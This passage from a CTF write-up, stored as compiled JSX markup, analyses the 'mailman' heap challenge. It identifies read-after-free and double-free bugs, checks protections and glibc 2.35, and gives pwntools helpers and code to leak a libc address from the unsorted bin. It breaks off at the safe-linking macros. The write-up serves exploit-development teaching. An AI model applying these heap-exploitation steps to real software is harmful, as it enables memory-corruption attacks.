operator\",children:\"\u0026\"}),\"bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000151f\"}),\"                  mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"rax_18\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"malloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"00001532\"}),\"                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"printf\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"format\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000155\"}),\"e                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"fgets\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"buf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"rax_18\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" n\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" bytes\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"d\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"stdin\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5              \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5                  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"rax_16 \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000014\"}),\"b5                      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"0000158\"}),\"d                  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"mem\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" mem\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"inidx\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"cd      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"puts\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"Invalid choice!\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),\"d7      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_exit\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"status\",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token number\",children:\"000015\"}),`d7      noreturn\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"inidx()\"}),\" is the function that grabs our index value from \",(0,n.jsx)(e.code,{children:\"stdin\"}),\". There\\u2019s no bug in it, and it crashes the program if we specify an index higher than 15. After setting \",(0,n.jsx)(e.code,{children:\"mem\"}),\" to be an array of \",(0,n.jsx)(e.code,{children:\"char*\"}),\", we see that the menu does mostly what we expected, except sending a letter is \",(0,n.jsx)(e.code,{children:\"free()\"}),\"-ing that index. It can be pretty easily seen that we have two major bugs here:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"A read after free\"}),`\n`,(0,n.jsx)(e.li,{children:\"Double free\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Sending a letter does not null the entry in \",(0,n.jsx)(e.code,{children:\"mem\"}),\", and there\\u2019s no check on the pointers in \",(0,n.jsx)(e.code,{children:\"mem\"}),\" when we read from them. The only thing preventing this from being trivial is an update function that would allow use after free.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Alright, let\\u2019s see what we have to work with in terms of other security features. A quick checksec shows:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`Arch:     amd64-64-little\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`RELRO:    Full RELRO\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Stack:    Canary found\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`NX:       NX enabled\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`PIE:      PIE enabled\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ah... full protections. That certainly restricts us a lot. Full RELRO means that the Global Offset Table is read only. This prevents us from modifying how the program resolves \",(0,n.jsx)(e.code,{children:\"libc\"}),\" functions when called. Speaking of libc, let\\u2019s check the version:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`srg@pop-os:~/CTF/ictf23/mailman$ ./libc.so.6\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"GNU C Library \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu GLIBC \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2.35\"}),\"-0ubuntu3.1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" stable release version \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2.35\"}),`.\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.em,{children:\"Ha!\"}),\" This is starting to become a very annoying challenge. Not that we could\\u2019ve had much luck anyway, \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\" prevents us from using one gadgets of any form, due to the lack of \",(0,n.jsx)(e.code,{children:\"execve\"}),\", but glibc 2.35 also removes two symbols \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and \",(0,n.jsx)(e.code,{children:\"__malloc_hook\"}),\" which were user defined function pointers that were called before calling \",(0,n.jsx)(e.code,{children:\"free()\"}),\" and \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\". Not to mention that because of \",(0,n.jsx)(e.code,{children:\"seccomp\"}),\", we can\\u2019t call \",(0,n.jsx)(e.code,{children:\"mmap\"}),\" or \",(0,n.jsx)(e.code,{children:\"mprotect\"}),\" to write our own code. glibc 2.35 also has a few annoying protections in that we\\u2019ll detail later.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, I need to setup our pwning environment. I use a tool called \",(0,n.jsx)(e.a,{href:\"https://github.com/io12/pwninit\",children:\"pwninit\"}),\", but there are similar tools out there.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./vuln_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc.so.6\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"leaky-program-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#leaky-program-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Leaky Program \",(0,n.jsx)(\"a\",{name:\"leaky\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ok, enough enumerating, we need to start by getting some leaks. We have no limitations to what size letter we can make (other than one larger 65536, due to \",(0,n.jsx)(e.code,{children:\"M_MMAP_MAX\"}),\"), so we can easily leak an address to libc.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"One of the main structures about how \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" manages its free lists, is that large chunks, when freed, go to a list called the \",(0,n.jsx)(e.code,{children:\"unsorted_bin\"}),\". While they are in these bins, they store pointers to the previous and next blocks of \",(0,n.jsx)(e.em,{children:\"free\"}),\" memory. However, when there is only one block, these pointers point to the \",(0,n.jsx)(e.code,{children:\"main_arena\"}),\", or the structure that manages all the bins for \",(0,n.jsx)(e.code,{children:\"malloc\"}),\". \",(0,n.jsx)(e.code,{children:\"main_arena\"}),\" is located in libc, and not the heap. These pointers are placed at the start of the data segment of the chunk, meaning that read after free bug that we have can leak out the libc pointer! If the reason for why a chunk has libc pointers, I\\u2019d highly look at the official post about malloc internals on the \",(0,n.jsx)(e.a,{href:\"https://sourceware.org/glibc/wiki/MallocInternals\",children:\"sourceware page\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, to leak libc we need to alloc 2 large chunks, free the first one, then read from that freed chunk. The reason we need to alloc the 2nd chunk is because malloc will try to combine adjacent blocks of free memory to be efficient, and if we leave a free block next to the top chunk (the remaining space of the heap), malloc will just coalesce it on \",(0,n.jsx)(e.code,{children:\"free()\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Because interacting with the menu can be verbose in exploit development, I also wrote some functions in pwntools to abstract away making, reading, and freeing chunks:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# either remote or process\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"alloc\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"ALLOCATING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"1\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"size: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"content: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"FREEING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"2\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"SHOWING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"3\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Now, leaking libc, we just follow the steps above. To make sure these chunks don\\u2019t end up in smaller bins, we have to make them large, so 1350 bytes was chosen arbitrarily. We\\u2019ll have to interact with the smaller bins soon, but just for now, for this leak to work in this way, large-ish chunks are sufficient:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Make two large chunks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Free the first one so bk = main_arena in libc\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# parse the libc address in little-endian\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use offsets found in gdb to compute libc base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10419ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10200000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Alright, with the libc leak we can now refer to many gadgets and functions with ease. But we still need more. It\\u2019s a safe bet to also grab a heap leak, but due to safe linking, the pointers are obfuscated:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-cpp\",children:(0,n.jsxs)(e.code,{className:\"language-cpp code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"PROTECT_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__typeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size_t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size_t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"REVEAL_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"PROTECT_PTR\"}),\" \",(0,n.jsx)(e.span,{className:\"token 